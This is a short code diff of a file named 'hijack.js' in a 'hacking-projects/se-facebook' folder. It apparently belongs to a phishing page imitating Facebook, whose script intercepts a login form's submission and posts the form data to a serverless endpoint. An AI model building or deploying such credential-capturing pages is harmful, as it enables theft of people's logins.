@@ -1,8 +1,9 @@
+// filepath: /home/isc-kfc/Duck_Cloud_Project/hacking-projects/se-facebook/public/hijack.js
 document.getElementById("loginForm").addEventListener("submit", function(event) {
     event.preventDefault();
     let formData = new FormData(this);
 
-    fetch('/api/submit-form', { // Updated to point to the serverless function
+    fetch('/api/submit-form', {
         method: "POST",
         body: formData
     })
